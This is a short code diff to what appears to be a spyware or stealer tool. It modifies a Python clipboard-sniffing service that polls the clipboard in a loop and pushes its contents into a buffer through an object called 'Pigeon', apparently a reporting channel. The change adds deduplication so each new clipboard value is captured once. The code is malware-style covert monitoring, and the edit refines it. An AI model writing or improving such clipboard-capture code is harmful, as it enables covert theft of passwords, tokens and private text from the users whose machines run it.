@@ -20,7 +20,10 @@ def clipboardSniffer(delay: int = 10) -> None:
 
 
 def __clipboardService(delay: int) -> None:
+    prev = ""
     while RUNNING.is_set():
         sleep(delay)
-        if paste() != "":
-            Pigeon.pushToBuffer("clipboard", "{} | ".format(paste()))
+        curr = paste()
+        if curr != "" and curr != prev:
+            Pigeon.pushToBuffer("clipboard", "{} | ".format(curr))
+            prev = curr
